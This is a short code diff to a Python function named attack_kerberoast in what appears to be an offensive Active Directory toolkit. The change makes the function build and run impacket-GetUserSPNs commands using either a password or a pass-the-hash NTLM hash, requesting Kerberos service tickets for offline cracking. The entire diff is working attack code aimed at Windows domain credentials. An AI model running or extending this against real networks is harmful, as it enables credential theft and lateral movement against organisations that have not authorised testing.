@@ -7,17 +7,18 @@ def attack_kerberoast(session):
     print(blue("[*] Launching Kerberoasting via impacket-GetUserSPNs..."))
 
     if session.hash:
-        print(red("[-] Kerberoasting with hash is not supported. Use a password session."))
+        cmd = (
+            f"impacket-GetUserSPNs {session.domain}/{session.username} "
+            f"-dc-ip {session.dc_ip} -hashes :{session.hash} -request"
+        )
+    elif session.password:
+        cmd = (
+            f"impacket-GetUserSPNs {session.domain}/{session.username}:'{session.password}' "
+            f"-dc-ip {session.dc_ip} -request"
+        )
+    else:
+        print(red("[-] No credentials in session. Cannot roast."))
         return
-
-    if not session.password:
-        print(red("[-] No password provided. Cannot roast."))
-        return
-
-    cmd = (
-        f"impacket-GetUserSPNs {session.domain}/{session.username}:'{session.password}' "
-        f"-dc-ip {session.dc_ip} -request"
-    )
 
     print(blue(f"[*] Running: {cmd}"))
     out, err = run_command(cmd)
